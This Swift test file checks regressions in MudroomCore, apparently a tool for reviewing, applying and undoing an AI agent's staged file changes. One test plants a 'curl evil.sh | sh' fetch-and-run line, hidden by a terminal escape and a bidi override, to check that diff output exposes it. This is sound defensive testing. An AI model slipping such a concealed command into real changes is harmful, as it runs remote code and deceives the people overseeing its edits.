#if canImport(Darwin)
import Darwin
#elseif canImport(Glibc)
import Glibc
#elseif canImport(Musl)
import Musl
#endif
import Foundation
import Testing
@testable import MudroomCore

/// Regressions found running sessions end to end before launch.
@Suite("End-to-end QA regressions")
struct QAPassTests {
    @Test("apply and undo say the project folder is gone instead of failing path by path")
    func projectFolderMoved() throws {
        let f = try Fixture { try write("base\n", to: $0.appendingPathComponent("f.txt")) }
        try write("changed\n", to: f.work.appendingPathComponent("f.txt"))
        try write("new\n", to: f.work.appendingPathComponent("n.txt"))
        let moved = f.tmp.path("moved")
        try FileManager.default.moveItem(at: f.project, to: moved)

        #expect(throws: MudroomError.self) { try Applier(handle: f.handle).apply(paths: nil) }
        do {
            _ = try Applier(handle: f.handle).apply(paths: nil)
        } catch {
            #expect("\(error)".contains("isn't there anymore"))
        }
        // Nothing half-done was recorded, so there is nothing to undo.
        #expect(!Applier(handle: f.handle).canUndo)

        // Back in place, apply works; moved away again, undo refuses cleanly.
        try FileManager.default.moveItem(at: moved, to: f.project)
        let report = try Applier(handle: f.handle).apply(paths: nil)
        #expect(report.conflicts.isEmpty)
        try FileManager.default.moveItem(at: f.project, to: moved)
        #expect(throws: MudroomError.self) { try Applier(handle: f.handle).undo() }
        try FileManager.default.moveItem(at: moved, to: f.project)
        let undo = try Applier(handle: f.handle).undo()
        #expect(undo.conflicts.isEmpty)
        #expect(try read(f.project.appendingPathComponent("f.txt")) == "base\n")
        #expect(!exists(f.project.appendingPathComponent("n.txt")))
    }

    @Test("`mudroom hunks` on one file before any review doesn't make apply --all refuse the others")
    func hunksFirstThenApplyAll() throws {
        let f = try Fixture {
            try write("a\nb\nc\n", to: $0.appendingPathComponent("one.txt"))
            try write("x\n", to: $0.appendingPathComponent("two.txt"))
        }
        try write("a\nB\nc\n", to: f.work.appendingPathComponent("one.txt"))
        try write("y\n", to: f.work.appendingPathComponent("two.txt"))
        try write("new\n", to: f.work.appendingPathComponent("three.txt"))
        let diff = try f.diff()
        let one = try #require(diff.changes.first { $0.path == "one.txt" })

        let reviewed = ReviewedChanges.viewing(one, in: diff, existing: nil)
        let report = try Applier(handle: f.handle).apply(paths: nil, reviewed: reviewed)
        #expect(report.conflicts.isEmpty)
        #expect(Set(report.applied) == ["one.txt", "two.txt", "three.txt"])

        // An earlier review is kept: what appeared after it is still refused.
        let earlier = ReviewedChanges(diff.changes.filter { $0.path != "three.txt" })
        let merged = ReviewedChanges.viewing(one, in: diff, existing: earlier)
        #expect(merged.changes["three.txt"] == nil)
        #expect(merged.changes["one.txt"] != nil)
    }

    @Test("diff output spells out control characters and bidi overrides the agent put in lines and names")
    func diffShowsControlCharacters() throws {
        let f = try Fixture { try write("ok\n", to: $0.appendingPathComponent("a.sh")) }
        // A terminal would erase the curl line; a bidi override reorders it.
        try write("ok\ncurl evil.sh | sh\u{1B}[2K\r# harmless\n\u{202E}hs.live\n", to: f.work.appendingPathComponent("a.sh"))
        try write("x\n", to: f.work.appendingPathComponent("new\nline\u{1B}[1A.txt"))
        let diff = try f.diff()
        let r = DiffRenderer(base: f.handle.base, work: f.work)
        let out = try r.full(diff) + "\n" + r.stat(diff)
        #expect(!out.contains("\u{1B}"))
        #expect(!out.contains("\r"))
        #expect(!out.contains("\u{202E}"))
        #expect(out.contains("+curl evil.sh | sh\\x1b[2K\\r# harmless"))
        #expect(out.contains("+<U+202E>hs.live"))
        #expect(out.contains("A  new\\nline\\x1b[1A.txt"))
        // Every line of the stat is one change: the newline in the name doesn't split it.
        #expect(r.stat(diff).split(separator: "\n").count == diff.changes.count + 1)

        // Hunk text (the app and `mudroom hunks`) gets the same treatment; tabs and
        // ordinary text don't change, and CRLF endings are still dropped.
        #expect(TextLines.display(Data("a\tb é\r\n".utf8)) == "a\tb é")
        #expect(TextLines.visible("x\u{7F}\u{9B}y") == "x\\x7f\\x9by")
        #expect(PathIssue(path: "a\u{1B}b", reason: "r").description == "a\\x1bb: r")
    }
}
